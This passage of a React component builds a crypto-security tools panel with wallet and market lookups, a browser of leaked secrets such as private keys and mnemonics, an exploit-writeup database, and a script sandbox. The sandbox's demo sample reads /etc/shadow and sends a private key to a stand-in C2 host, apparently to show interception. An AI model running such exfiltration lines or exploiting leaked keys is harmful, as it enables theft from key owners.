import { useState, useEffect, useRef } from "react";
import { useTranslation } from "react-i18next";
import {
  Users,
  ArrowLeftRight,
  TrendingUp,
  ShieldCheck,
  GitCompare,
  Loader2,
  Lock,
  Search,
  AlertTriangle,
  Globe,
  Compass,
  KeyRound,
  History,
  Eye,
  Copy,
  Check,
  Flame,
  Layers,
  Radar,
  Zap,
  Terminal,
  UserCheck,
  BookOpen,
} from "lucide-react";
import {
  getSavedUser,
  authHeaders,
  apiGetToolHistory,
  apiGetToolHistoryItem,
  apiGetOspecFindingDetail,
  apiGetHackWriteup,
  type BorisUser,
  type BorisToolHistoryItem,
} from "@/lib/auth";

const API_BASE = "https://api.black-oracle.com";

type ToolId =
  | "holders"
  | "funds"
  | "market"
  | "social"
  | "soroban"
  | "ospec"
  | "zk"
  | "drift"
  | "hacks"
  | "proxy"
  | "surface"
  | "flash"
  | "deployer"
  | "sandbox";

const TIER_RANK: Record<string, number> = { GUEST: 0, RADAR: 1, RAW: 2, BLACKBOX: 3 };

const ToolsPanel = () => {
  const { i18n } = useTranslation();
  const isRu = i18n.language === "ru";
  const user = getSavedUser() as BorisUser | null;
  const tier = (user?.tier || "GUEST").toUpperCase();
  const rank = TIER_RANK[tier] ?? 0;

  const [tool, setTool] = useState<ToolId>("holders");
  const [input1, setInput1] = useState("");
  const [input2, setInput2] = useState("");
  const [chain, setChain] = useState("ethereum");
  const [fundsMode, setFundsMode] = useState<"auto" | "address" | "pool" | "multichain">("auto");
  const [fundsDays, setFundsDays] = useState<number>(14);
  const [marketMode, setMarketMode] = useState<"single" | "trending">("single");
  const [trendingCount, setTrendingCount] = useState<number>(10);
  const [selectedTrendingDossier, setSelectedTrendingDossier] = useState<any>(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [result, setResult] = useState<any>(null);

  const [historyItems, setHistoryItems] = useState<BorisToolHistoryItem[]>([]);
  const [historyFilter, setHistoryFilter] = useState<string>("all");
  const [loadingHistoryId, setLoadingHistoryId] = useState<number | null>(null);

  // OSPEC Telegram-style filter states
  const [ospecSeverity, setOspecSeverity] = useState<string>("");
  const [ospecOnlyReal, setOspecOnlyReal] = useState<boolean>(true);
  const [ospecOnlyLive, setOspecOnlyLive] = useState<boolean>(false);
  const [ospecOffset, setOspecOffset] = useState<number>(0);
  const [expandedFindingId, setExpandedFindingId] = useState<number | null>(null);
  const [findingDetail, setFindingDetail] = useState<Record<number, any>>({});
  const [loadingFindingId, setLoadingFindingId] = useState<number | null>(null);
  const [copiedSecretId, setCopiedSecretId] = useState<string | null>(null);
  const [openedHistoryBanner, setOpenedHistoryBanner] = useState<string | null>(null);

  // Full Markdown Writeup viewer for the 1,678 Deep Exploits DB
  const [expandedWriteupSlug, setExpandedWriteupSlug] = useState<string | null>(null);
  const [writeupCache, setWriteupCache] = useState<Record<string, any>>({});
  const [loadingWriteupSlug, setLoadingWriteupSlug] = useState<string | null>(null);

  const handleToggleWriteup = async (slug: string, title?: string) => {
    const key = slug || title || "";
    if (!key) return;
    if (expandedWriteupSlug === key && writeupCache[key]) {
      setExpandedWriteupSlug(null);
      return;
    }
    setExpandedWriteupSlug(key);
    if (writeupCache[key]) return;
    setLoadingWriteupSlug(key);
    try {
      const data = await apiGetHackWriteup(slug, title);
      setWriteupCache((prev) => ({ ...prev, [key]: data }));
    } catch (e: any) {
      setWriteupCache((prev) => ({ ...prev, [key]: { error: e.message } }));
    } finally {
      setLoadingWriteupSlug(null);
    }
  };

  const skipAutoOspecRef = useRef<boolean>(false);
  const resultsTopRef = useRef<HTMLDivElement | null>(null);

  const handleToggleOspecFinding = async (fid: number) => {
    if (expandedFindingId === fid) {
      setExpandedFindingId(null);
      return;
    }
    setExpandedFindingId(fid);
    if (findingDetail[fid]) return;
    setLoadingFindingId(fid);
    try {
      const detail = await apiGetOspecFindingDetail(fid);
      setFindingDetail((prev) => ({ ...prev, [fid]: detail }));
    } catch {
      // ignore
    } finally {
      setLoadingFindingId(null);
    }
  };

  const loadHistory = (filter?: string) => {
    const f = filter ?? historyFilter;
    apiGetToolHistory(f === "all" ? undefined : f).then(setHistoryItems);
  };

  useEffect(() => {
    loadHistory(historyFilter);
  }, [historyFilter]);

  const runOspecWithFilters = async (opts?: {
    q?: string;
    sev?: string;
    real?: boolean;
    live?: boolean;
    offset?: number;
  }) => {
    if (rank < 1) return;
    const qVal = opts?.q !== undefined ? opts.q : input1.trim();
    const sevVal = opts?.sev !== undefined ? opts.sev : ospecSeverity;
    const realVal = opts?.real !== undefined ? opts.real : ospecOnlyReal;
    const liveVal = opts?.live !== undefined ? opts.live : ospecOnlyLive;
    const offsetVal = opts?.offset !== undefined ? opts.offset : 0;
    setOspecOffset(offsetVal);

    setError(null);
    setOpenedHistoryBanner(null);
    setLoading(true);
    try {
      const res = await fetch(`${API_BASE}/api/tools/ospec`, {
        method: "POST",
        headers: { "Content-Type": "application/json", ...authHeaders() },
        body: JSON.stringify({
          query: qVal,
          severity: sevVal,
          only_real: realVal,
          only_live: liveVal,
          offset: offsetVal,
        }),
      });
      const data = await res.json().catch(() => ({}));
      if (!res.ok) throw new Error(data.detail || `HTTP ${res.status}`);
      setResult(data);
      loadHistory(historyFilter);
    } catch (e: any) {
      setError(e.message || "OSPEC error");
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    if (skipAutoOspecRef.current) {
      skipAutoOspecRef.current = false;
      return;
    }
    if (tool === "ospec" && rank >= 1 && !result) {
      runOspecWithFilters({ q: "", sev: "", real: true, live: false, offset: 0 });
    }
  }, [tool]);

  const TOOLS: Array<{
    id: ToolId;
    labelRu: string;
    labelEn: string;
    icon: any;
    minRank: number;
    placeholder: string;
  }> = [
    { id: "holders", labelRu: "Холдеры и киты", labelEn: "Holders & Whales", icon: Users, minRank: 0, placeholder: "0xA0b86991...B48" },
    { id: "market", labelRu: "Рынок и деривативы", labelEn: "Market & Derivatives", icon: TrendingUp, minRank: 0, placeholder: "BTC / ETH / SOL / PEPE" },
    { id: "funds", labelRu: "Потоки средств 14д", labelEn: "Funds Flow 14d", icon: ArrowLeftRight, minRank: 1, placeholder: "0xA0b86991...B48" },
    { id: "social", labelRu: "Social & OSINT", labelEn: "Social & OSINT", icon: Globe, minRank: 0, placeholder: "@handle, org/repo, t.me/..., x.com/..." },
    { id: "soroban", labelRu: "Soroban / Stellar", labelEn: "Soroban / Stellar", icon: Compass, minRank: 0, placeholder: "USDC, AQUA, CODE:ISSUER, C..." },
    { id: "ospec", labelRu: "OSPEC (Утечки 1.1M)", labelEn: "OSPEC (1.1M Secrets)", icon: KeyRound, minRank: 1, placeholder: "Фильтр по типу секрета или org/repo (пусто = последние находки)" },
    { id: "hacks", labelRu: "База 2,539 взломов (1,678 разборов + PoC)", labelEn: "2,539 Exploits DB (1,678 Writeups + PoC)", icon: Flame, minRank: 1, placeholder: "0x... контракт ИЛИ поиск по 1,678 разборам: uranium, euler, curve, slot0, reentrancy" },
    { id: "deployer", labelRu: "Деплоер & Профайлер Адреса", labelEn: "Deployer & Address Profiler", icon: UserCheck, minRank: 1, placeholder: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48 (1 или несколько 0x-адресов)" },
    { id: "proxy", labelRu: "Proxy & EIP-1967 Инспектор", labelEn: "Proxy & EIP-1967 Inspector", icon: Layers, minRank: 1, placeholder: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" },
    { id: "flash", labelRu: "Flash-Loan & Spot-Оракул", labelEn: "Flash-Loan & Spot Oracle", icon: Zap, minRank: 1, placeholder: "0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2" },
    { id: "surface", labelRu: "Web3 Surface Mapper (Домен)", labelEn: "Web3 Surface Mapper (Domain)", icon: Radar, minRank: 1, placeholder: "across.to / rhino.fi / app.aave.com" },
    { id: "drift", labelRu: "Audit Drift (Репозиторий)", labelEn: "Audit Drift (Repo Audits)", icon: GitCompare, minRank: 1, placeholder: "https://github.com/aave/aave-v3-core или org/repo" },
    { id: "zk", labelRu: "ZK / Groth16 аудит", labelEn: "ZK Groth16 Audit", icon: ShieldCheck, minRank: 2, placeholder: "0x... verifier" },
    { id: "sandbox", labelRu: "Matrix Sandbox v16.2", labelEn: "Matrix Sandbox v16.2", icon: Terminal, minRank: 2, placeholder: "import requests, subprocess..." },
  ];

  const validateToolInput = (tId: ToolId, rawVal: string): string | null => {
    const val = (rawVal || "").trim();
    const hasCyrillic = /[А-Яа-яЁё]/.test(val);
    const hasMash = /(asdf|qwerty|zxcv|йцук|фыва|ячсм|1234567)/i.test(val) || /(.)\1{6,}/i.test(val);
    const isEvm = /^0x[a-fA-F0-9]{40}$/.test(val);
    const isGarbageEvm =
      isEvm &&
      (/^0x0{40}$/i.test(val) ||
        /^0xf{40}$/i.test(val) ||
        val.slice(2, 6) === "0000" ||
        val.slice(10, 34) === "0".repeat(24) ||
        new Set(val.slice(2).toLowerCase().split("")).size <= 3);

    if (tId !== "sandbox" && (val.includes("\n") || val.includes("\r") || val.length > 160)) {
      return isRu
        ? "Защита от каши: обнаружена многострочная вставка или слишком длинный текст. Введите точный идентификатор."
        : "Invalid multi-line or oversized input pasted. Enter a valid target identifier.";
    }
    if (hasMash) {
      return isRu
        ? "Защита от каши: обнаружена случайная комбинация символов. Введите реальный адрес, тикер или репозиторий."
        : "Garbage input detected. Please enter a real contract address, ticker, or repository.";
    }

    if (tId === "holders" || tId === "funds" || tId === "proxy" || tId === "flash" || tId === "zk") {
      if (!isEvm) {
        return isRu
          ? "Для этого инструмента требуется валидный EVM-адрес смарт-контракта (42 символа: 0x + 40 hex-символов без пробелов)."
          : "This tool requires a valid 42-character 0x EVM contract address.";
      }
      if (isGarbageEvm) {
        return isRu
          ? "Указанный 0x-адрес является нулевым, тестовым плейсхолдером или обрезком ABI."
          : "The provided 0x address is a zero address, test placeholder, or ABI selector fragment.";
      }
      return null;
    }

    if (tId === "deployer") {
      if (!val || hasCyrillic) {
        return isRu
          ? "Укажите один или несколько 42-символьных 0x-адресов через пробел или запятую."
          : "Enter one or more 42-character 0x addresses separated by comma or space.";
      }
      const parts = val.split(/[\s,;]+/).filter(Boolean);
      for (const p of parts) {
        if (!/^0x[a-fA-F0-9]{40}$/.test(p)) {
          return isRu
            ? `Некорректный фрагмент '${p.slice(0, 20)}': в Профайлер Адреса можно вставлять только 42-символьные 0x-адреса.`
            : `Invalid token '${p.slice(0, 20)}': only 42-character 0x addresses are allowed.`;
        }
      }
      return null;
    }

    if (tId === "market") {
      if (marketMode === "trending") return null;
      const cleanSym = val.replace(/^\$/, "");
      if (!cleanSym || hasCyrillic || /\s/.test(cleanSym)) {
        return isRu
          ? "Введите тикер монеты латиницей без пробелов (например BTC, ETH, DOGE, SOL, AAVE)."
          : "Enter an alphanumeric coin ticker without spaces (e.g. BTC, ETH, DOGE, SOL, AAVE).";
      }
      if (cleanSym.toLowerCase().startsWith("0x") && cleanSym.length >= 20) {
        return isRu
          ? "Вы вставили 0x-адрес вместо тикера монеты. Введите короткий биржевой тикер (например AAVE, USDT, DOGE)."
          : "You pasted a 0x address instead of a coin ticker. Enter a ticker symbol (e.g. AAVE, USDT, DOGE).";
      }
      if (!/^[A-Za-z0-9]{2,12}$/.test(cleanSym)) {
        return isRu
          ? `Недопустимый формат тикера '${cleanSym.slice(0, 16)}': используйте от 2 до 12 латинских букв/цифр.`
          : `Invalid ticker format '${cleanSym.slice(0, 16)}': use 2–12 alphanumeric characters.`;
      }
      return null;
    }

    if (tId === "surface") {
      if (!val || hasCyrillic || /\s/.test(val)) {
        return isRu
          ? "Укажите веб-домен протокола без пробелов (например aave.com, dexe.network, across.to)."
          : "Enter a protocol domain without spaces (e.g. aave.com, dexe.network, across.to).";
      }
      if (val.toLowerCase().startsWith("0x")) {
        return isRu
          ? "Вы вставили 0x-адрес вместо веб-домена. Для Web3 Surface Mapper нужен домен сайта (например aave.com)."
          : "You pasted a 0x address instead of a domain. Enter a website domain (e.g. aave.com).";
      }
      if (val.toLowerCase().includes("github.com/") || (!val.startsWith("http") && val.includes("/"))) {
        return isRu
          ? "Вы вставили ссылку на GitHub-репозиторий вместо веб-домена протокола. Укажите домен сайта (например aave.com)."
          : "You pasted a repository path instead of a website domain. Enter a domain (e.g. aave.com).";
      }
      if (!/^(https?:\/\/)?([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,24}(\/.*)?$/.test(val)) {
        return isRu
          ? "Некорректный формат домена. Пример: aave.com или https://app.aave.com"
          : "Invalid domain format. Example: aave.com or https://app.aave.com";
      }
      return null;
    }

    if (tId === "drift") {
      if (!val || hasCyrillic || /\s/.test(val) || !/^(https?:\/\/(www\.)?github\.com\/)?[A-Za-z0-9_.-]{2,50}\/[A-Za-z0-9_.-]{2,80}(\.git)?\/?$/.test(val)) {
        return isRu
          ? "Укажите ссылку на GitHub-репозиторий или org/repo (например aave/aave-v3-core)."
          : "Enter a valid GitHub repository URL or org/repo (e.g. aave/aave-v3-core).";
      }
      return null;
    }

    if (tId === "soroban") {
      if (!val || hasCyrillic || /\s/.test(val) || val.toLowerCase().startsWith("0x")) {
        return isRu
          ? "Укажите ассет Stellar (USDC, AQUA, CODE:ISSUER) или 56-символьный контракт Soroban (C...)."
          : "Enter a Stellar asset (USDC, AQUA, CODE:ISSUER) or a 56-char Soroban C... contract.";
      }
      if (!(/^[GC][A-Z2-7]{55}$/.test(val) || /^[A-Za-z0-9]{1,12}:G[A-Z2-7]{55}$/.test(val) || /^[A-Za-z0-9]{2,12}$/.test(val))) {
        return isRu
          ? "Недопустимый формат Stellar/Soroban цели. Используйте тикер (USDC), CODE:ISSUER или адрес G.../C... (56 символов)."
          : "Invalid Stellar/Soroban format.";
      }
      return null;
    }

    if (tId === "social") {
      if (!val || hasCyrillic || val.split(/\s+/).length > 3) {
        return isRu
          ? "Введите @handle, название проекта латиницей (до 3 слов) или ссылку на X / Telegram / GitHub."
          : "Enter @handle, project name (up to 3 words), or an X / Telegram / GitHub URL.";
      }
      return null;
    }

    if (tId === "ospec") {
      if (val && (hasCyrillic || val.split(/\s+/).length > 3)) {
        return isRu
          ? "В фильтре OSPEC укажите тип секрета (private_key, mnemonic, aws, alchemy) или org/repo латиницей."
          : "Enter a secret kind (private_key, mnemonic, aws, alchemy) or org/repo.";
      }
      return null;
    }

    if (tId === "hacks") {
      if (val && (hasCyrillic || val.split(/\s+/).length > 4 || (val.startsWith("0x") && !isEvm))) {
        return isRu
          ? "Введите валидный 0x-адрес контракта (42 символа) ИЛИ поисковый запрос латиницей (например euler, curve, slot0)."
          : "Enter a valid 42-char 0x address OR a search keyword (e.g. euler, curve, slot0).";
      }
      return null;
    }

    if (tId === "sandbox") {
      if (!val || val.length < 5 || (!val.includes("(") && !val.includes("=") && !val.includes("import "))) {
        return isRu
          ? "Вставьте реальный Python / Web3 код или PoC-скрипт (произвольный текст без инструкций Python отклонён)."
          : "Paste valid Python / Web3 script code (plain text without Python statements is rejected).";
      }
      return null;
    }

    return null;
  };

  const runTrendingScan = async (cntOverride?: number) => {
    const cnt = cntOverride ?? trendingCount;
    setError(null);
    setResult(null);
    setSelectedTrendingDossier(null);
    setLoading(true);
    try {
      const res = await fetch(`${API_BASE}/api/tools/market/trending`, {
        method: "POST",
        headers: { "Content-Type": "application/json", ...authHeaders() },
        body: JSON.stringify({ count: cnt }),
      });
      const data = await res.json().catch(() => ({}));
      if (!res.ok) throw new Error(data.detail || `HTTP ${res.status}`);
      setResult(data);
      loadHistory(historyFilter);
    } catch (e: any) {
      setError(e.message || "Trending Scanner error");
    } finally {
      setLoading(false);
    }
  };

  const run = async () => {
    const valErr = validateToolInput(tool, input1);
    if (valErr) {
      setError(valErr);
      return;
    }
    if (tool === "ospec") {
      await runOspecWithFilters();
      return;
    }
    if (tool === "market" && marketMode === "trending") {
      await runTrendingScan(trendingCount);
      return;
    }
    setSelectedTrendingDossier(null);
    setError(null);
    setResult(null);
    setLoading(true);
    try {
      let path = "";
      let body: any = {};
      if (tool === "holders") {
        path = "/api/tools/holders";
        body = { address: input1.trim(), chain };
      } else if (tool === "funds") {
        path = "/api/tools/funds-flow";
        body = { address: input1.trim(), chain, days: fundsDays, mode: fundsMode };
      } else if (tool === "market") {
        path = "/api/tools/market";
        body = { symbol: input1.trim().toUpperCase() };
      } else if (tool === "social") {
        path = "/api/tools/social";
        body = { target: input1.trim() };
      } else if (tool === "soroban") {
        path = "/api/tools/soroban";
        body = { target: input1.trim() };
      } else if (tool === "zk") {
        path = "/api/tools/zk-audit";
        body = { address: input1.trim(), chain };
      } else if (tool === "hacks") {
        path = "/api/tools/hack-matcher";
        body = { address: input1.trim(), chain };
      } else if (tool === "proxy") {
        path = "/api/tools/proxy-check";
        body = { address: input1.trim(), chain };
      } else if (tool === "surface") {
        path = "/api/tools/surface-map";
        body = { domain: input1.trim() };
      } else if (tool === "flash") {
        path = "/api/tools/flash-spot";
        body = { address: input1.trim(), chain };
      } else if (tool === "deployer") {
        path = "/api/tools/address-profile";
        body = { address: input1.trim(), chain };
      } else if (tool === "sandbox") {
        path = "/api/tools/sandbox";
        body = { code: input1 };
      } else {
        path = "/api/tools/drift-compare";
        body = { repo_url: input1.trim() };
      }

      const res = await fetch(`${API_BASE}${path}`, {
        method: "POST",
        headers: { "Content-Type": "application/json", ...authHeaders() },
        body: JSON.stringify(body),
      });
      if (res.status === 403) {
        const d = await res.json().catch(() => ({}));
        throw new Error(d.detail || (isRu ? "Этот инструмент недоступен на вашем тарифе." : "This tool is not available on your tier."));
      }
      if (res.status === 401) {
        throw new Error(isRu ? "Требуется вход в личный кабинет." : "Sign in required.");
      }
      if (!res.ok) {
        const d = await res.json().catch(() => ({}));
        throw new Error(d.detail || `HTTP ${res.status}`);
      }
      setResult(await res.json());
      loadHistory(historyFilter);
    } catch (e: any) {
      setError(e.message || "Error");
    } finally {
      setLoading(false);
    }
  };

  const handleOpenHistoryItem = async (item: BorisToolHistoryItem) => {
    setLoadingHistoryId(item.id);
    setError(null);
    try {
      const data = await apiGetToolHistoryItem(item.id);
      if (data && data.result) {
        skipAutoOspecRef.current = true;
        const r = data.result;
        // Normalize legacy OSPEC history records if needed
        if (item.tool === "ospec" && Array.isArray(r.findings)) {
          r.findings = r.findings.map((f: any) => ({
            ...f,
            hits: f.hits || 1,
            kind: String(f.kind || "SECRET").replace("secret:", ""),
            gh_url: f.gh_url || f.repo_url || "",
          }));
          if (!r.filter_mode) r.filter_mode = `history:${item.target}`;
        }
        setTool(item.tool as ToolId);
        setInput1(item.target || "");
        setResult(r);
        setOpenedHistoryBanner(
          `${item.tool.toUpperCase()} · ${item.target} (${new Date(item.created_at * 1000).toLocaleString()})`
        );
        setTimeout(() => {
          resultsTopRef.current?.scrollIntoView({ behavior: "smooth", block: "start" });
        }, 80);
      }
    } catch (e: any) {
      setError(e.message || "Failed to load saved tool report");
    } finally {
      setLoadingHistoryId(null);
    }
  };

  const active = TOOLS.find((t) => t.id === tool)!;
  const locked = rank < active.minRank;

  const fmt = (n: any, digits = 2) => {
    const v = Number(n);
    if (!isFinite(v)) return "—";
    if (Math.abs(v) >= 1e9) return (v / 1e9).toFixed(2) + "B";
    if (Math.abs(v) >= 1e6) return (v / 1e6).toFixed(2) + "M";
    if (Math.abs(v) >= 1e3) return (v / 1e3).toFixed(2) + "K";
    return v.toFixed(digits);
  };

  return (
    <div ref={resultsTopRef} className="space-y-5">
      {openedHistoryBanner && (
        <div className="flex items-center justify-between gap-3 rounded-xl border border-primary/50 bg-primary/10 px-4 py-2.5 font-mono text-xs text-primary">
          <span>
            📂 {isRu ? "Открыт сохранённый отчёт из истории:" : "Loaded saved report from history:"}{" "}
            <b className="text-foreground">{openedHistoryBanner}</b>
          </span>
          <button
            type="button"
            onClick={() => setOpenedHistoryBanner(null)}
            className="text-muted-foreground hover:text-foreground"
          >
            ✕
          </button>
        </div>
      )}
      {/* Tool selector */}
      <div className="flex flex-wrap gap-2">
        {TOOLS.map((t) => {
          const Icon = t.icon;
          const isLocked = rank < t.minRank;
          return (
            <button
              key={t.id}
              onClick={() => {
                setTool(t.id);
                setResult(null);
                setError(null);
                setInput1("");
                setInput2("");
              }}
              className={`inline-flex items-center gap-2 rounded-xl px-3.5 py-2.5 font-mono text-xs font-semibold transition-all ${
                tool === t.id
                  ? "bg-primary text-primary-foreground shadow"
                  : "border border-border bg-card text-muted-foreground hover:text-foreground"
              }`}
            >
              <Icon size={14} />
              <span>{isRu ? t.labelRu : t.labelEn}</span>
              {isLocked && <Lock size={11} className="opacity-70" />}
            </button>
          );
        })}
      </div>

      {/* Input form */}
      {locked ? (
        <div className="rounded-xl border border-primary/35 bg-card p-8 text-center bg-radial-red">
          <div className="mx-auto mb-3 flex h-12 w-12 items-center justify-center rounded-2xl border border-primary/40 bg-primary/15 text-primary">
            <Lock size={22} />
          </div>
          <span className="rounded-full border border-primary/40 bg-primary/15 px-3 py-1 font-mono text-[10px] font-bold uppercase tracking-widest text-primary">
            {active.minRank === 2 ? "RAW / BLACKBOX REQUIRED" : "RADAR+ REQUIRED"}
          </span>
          <p className="mx-auto mt-3 max-w-md font-mono text-xs text-muted-foreground">
            {isRu
              ? `Инструмент «${active.labelRu}» доступен начиная с тарифа ${active.minRank === 2 ? "RAW" : "RADAR"}.`
              : `"${active.labelEn}" requires ${active.minRank === 2 ? "RAW" : "RADAR"} tier or higher.`}
          </p>
        </div>
      ) : (
        <div className="rounded-xl border border-border bg-card p-5 space-y-3">
          {tool === "sandbox" ? (
            <div className="space-y-3">
              <div className="flex flex-wrap items-center justify-between gap-2 font-mono text-xs">
                <span className="text-muted-foreground">
                  {isRu
                    ? "Вставьте подозрительный Python / Web3 скрипт или PoC-эксплойт (вызовы requests/subprocess/os/socket/web3 перехватываются до исполнения):"
                    : "Paste untrusted Python / Web3 script or PoC (requests/subprocess/os/socket/web3 calls are intercepted pre-execution):"}
                </span>
                <button
                  type="button"
                  onClick={() =>
                    setInput1(
                      `import requests, subprocess\n# Matrix Sandbox v16.2 Demo: secret file read + C2 exfil + shell spawn\ntry:\n    open("/etc/shadow").read()\nexcept Exception as e:\n    print("Blocked secret file:", e)\nrequests.post("https://c2-collector.example/drop", json={"pk": "0xdeadbeef"})\nsubprocess.run(["id"])\nprint("Sandbox execution finished")`
                    )
                  }
                  className="rounded-lg border border-primary/40 bg-primary/10 px-2.5 py-1 text-[11px] font-semibold text-primary hover:bg-primary hover:text-primary-foreground"
                >
                  {isRu ? "⚡ Вставить демо-тест Matrix v16.2" : "⚡ Load Matrix v16.2 Demo"}
                </button>
              </div>
              <textarea
                rows={6}
                value={input1}
                onChange={(e) => setInput1(e.target.value)}
                placeholder={active.placeholder}
                className="w-full rounded-xl border border-border bg-background p-3.5 font-mono text-xs text-foreground outline-none focus:border-primary"
              />
              <div className="flex justify-end">
                <button
                  onClick={run}
                  disabled={loading || !input1.trim()}
                  className="inline-flex items-center justify-center gap-2 rounded-xl bg-primary px-5 py-2.5 font-mono text-xs font-semibold text-primary-foreground transition-all hover:bg-primary-dim disabled:opacity-40 btn-glow"
                >
                  {loading ? <Loader2 size={14} className="animate-spin" /> : <Terminal size={14} />}
                  <span>{loading ? (isRu ? "Изоляция v16.2…" : "Isolating v16.2…") : isRu ? "Запустить в Matrix Sandbox v16.2" : "Run in Matrix Sandbox v16.2"}</span>
                </button>
              </div>
            </div>
          ) : (
            <div className="grid grid-cols-1 gap-3 sm:grid-cols-4">
              <input
                value={input1}
                onChange={(e) => setInput1(e.target.value)}
                onKeyDown={(e) => e.key === "Enter" && (tool === "ospec" || tool === "hacks" || input1) && run()}
                placeholder={active.placeholder}
                className="rounded-xl border border-border bg-background px-4 py-3 font-mono text-xs text-foreground outline-none focus:border-primary sm:col-span-2"
              />
              {(tool === "holders" || tool === "funds" || tool === "zk" || tool === "hacks" || tool === "proxy" || tool === "flash" || tool === "deployer") ? (
                <select
                  value={chain}
                  onChange={(e) => setChain(e.target.value)}
                  className="rounded-xl border border-border bg-background px-3 py-3 font-mono text-xs text-foreground outline-none focus:border-primary"
                >
                  {["ethereum", "bsc", "polygon", "arbitrum", "base", "optimism"].map((c) => (
                    <option key={c} value={c}>
                      {c.toUpperCase()}
                    </option>
                  ))}
                </select>
              ) : (
                <div className="flex items-center rounded-xl border border-border bg-background/60 px-4 py-3 font-mono text-xs text-muted-foreground">
                  {tool === "market"
                    ? isRu ? "Тикер монеты" : "Coin ticker"
                    : tool === "social"
                    ? "X / TG / Discord / GitHub"
                    : tool === "soroban"
                    ? "Stellar / Soroban SIM"
                    : tool === "drift"
                    ? isRu ? "Папки audits/ + Git Drift" : "audits/ PDFs + Git Drift"
                    : tool === "surface"
                    ? "Subdomains + JS Bundles"
                    : "OSPEC Harvester DB (RADAR+)"}
                </div>
              )}
              <button
                onClick={run}
                disabled={loading || (tool !== "ospec" && tool !== "hacks" && !(tool === "market" && marketMode === "trending") && !input1)}
                className="inline-flex items-center justify-center gap-2 rounded-xl bg-primary px-4 py-3 font-mono text-xs font-semibold text-primary-foreground transition-all hover:bg-primary-dim disabled:opacity-40 btn-glow"
              >
                {loading ? <Loader2 size={14} className="animate-spin" /> : <Search size={14} />}
                <span>{loading ? (isRu ? "Считаю…" : "Running…") : isRu ? "Запустить" : "Run"}</span>
              </button>
            </div>
          )}

          {/* Quick presets for Holders & Whales */}
          {tool === "holders" && (
            <div className="flex flex-wrap items-center gap-2 pt-1 font-mono text-[11px]">
              <span className="text-muted-foreground">{isRu ? "Быстрые токены:" : "Quick tokens:"}</span>
              {[
                { label: "USDT (Ethereum)", val: "0xdAC17F958D2ee523a2206206994597C13D831ec7" },
                { label: "USDC (Ethereum)", val: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" },
                { label: "AAVE Token", val: "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9" },
                { label: "Lido stETH", val: "0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84" },
                { label: "DeXe (DEXE)", val: "0xde4EE8057785A7e8e800Db58F9784845A5C2cbd6" },
              ].map((p) => (
                <button
                  key={p.val}
                  type="button"
                  onClick={() => setInput1(p.val)}
                  className="rounded-lg border border-border bg-background px-2.5 py-1 text-muted-foreground hover:border-primary hover:text-primary"
                >
                  {p.label}
                </button>
              ))}
            </div>
          )}

          {/* Mode Switcher (Single Token vs Trending Scanner) + Quick presets for Market & Derivatives */}
          {tool === "market" && (
            <div className="space-y-2.5 pt-1 font-mono text-[11px]">
              <div className="flex flex-wrap items-center justify-between gap-2 border-t border-border/60 pt-2.5">
                <div className="flex flex-wrap items-center gap-2">
                  <span className="text-muted-foreground">{isRu ? "Режим Market Engine:" : "Market Engine Mode:"}</span>
                  <button
                    type="button"
                    onClick={() => {
                      setMarketMode("single");
                      setSelectedTrendingDossier(null);
                    }}
                    className={`rounded-lg border px-3 py-1 font-semibold transition-all ${
                      marketMode === "single"
                        ? "border-primary bg-primary/15 text-primary"
                        : "border-border bg-background text-muted-foreground hover:text-foreground"
                    }`}
                  >
                    🔍 {isRu ? "Скан тикера (Single Token)" : "Single Token Scan"}
                  </button>
                  <button
                    type="button"
                    onClick={() => {
                      if (rank < 2) {
                        setError(
                          isRu
                            ? "🔥 Трендовый сканер (Поиск по трендам CoinGecko) доступен на тарифах RAW и BLACKBOX (как и в Telegram-боте)."
                            : "🔥 Trending Scanner (CoinGecko Trend Search) requires RAW or BLACKBOX tier."
                        );
                        return;
                      }
                      setMarketMode("trending");
                      runTrendingScan(trendingCount);
                    }}
                    disabled={loading}
                    className={`rounded-lg border px-3 py-1 font-semibold transition-all ${
                      marketMode === "trending"
                        ? "border-primary bg-primary text-primary-foreground shadow"
                        : "border-primary/40 bg-primary/10 text-primary hover:bg-primary hover:text-primary-foreground"
                    }`}
                  >
                    🔥 {isRu ? "Трендовый сканер (CoinGecko Trending)" : "Trending Scanner (CoinGecko)"}
                  </button>
                </div>

                <div className="flex flex-wrap items-center gap-1.5">
                  <span className="text-muted-foreground">{isRu ? "Монет в тренде:" : "Trending batch:"}</span>
                  {[
                    { cnt: 5, label: "Quick (5)" },
                    { cnt: 10, label: "Normal (10)" },
                    { cnt: 15, label: "Full (15)" },
                  ].map((b) => (
                    <button
                      key={b.cnt}
                      type="button"
                      disabled={loading}
                      onClick={() => {
                        if (rank < 2) {
                          setError(
                            isRu
                              ? "🔥 Трендовый сканер (5 / 10 / 15 монет) доступен на тарифах RAW и BLACKBOX."
                              : "🔥 Trending Scanner requires RAW or BLACKBOX tier."
                          );
                          return;
                        }
                        setTrendingCount(b.cnt);
                        setMarketMode("trending");
                        runTrendingScan(b.cnt);
                      }}
                      className={`rounded-lg border px-2.5 py-1 font-semibold transition-all ${
                        marketMode === "trending" && trendingCount === b.cnt
                          ? "border-primary bg-primary/20 text-primary"
                          : "border-border bg-background text-muted-foreground hover:border-primary hover:text-primary"
                      }`}
                    >
                      {b.label}
                    </button>
                  ))}
                </div>
              </div>

              <div className="flex flex-wrap items-center gap-2">
                <span className="text-muted-foreground">{isRu ? "Быстрые тикеры:" : "Quick tickers:"}</span>
                {["DOGE", "BTC", "ETH", "SOL", "AAVE", "PEPE", "ENA", "ARB"].map((sym) => (
                  <button
                    key={sym}
                    type="button"
                    onClick={() => {
                      setMarketMode("single");
                      setInput1(sym);
                    }}
                    className="rounded-lg border border-border bg-background px-2.5 py-1 text-muted-foreground hover:border-primary hover:text-primary"
                  >
                    ${sym}
                  </button>
                ))}
              </div>
            </div>
          )}

          {/* Mode & Days selector + Quick presets for Funds Flow */}
          {tool === "funds" && (
            <div className="flex flex-wrap items-center justify-between gap-2 pt-1 font-mono text-[11px]">
              <div className="flex flex-wrap items-center gap-1.5">
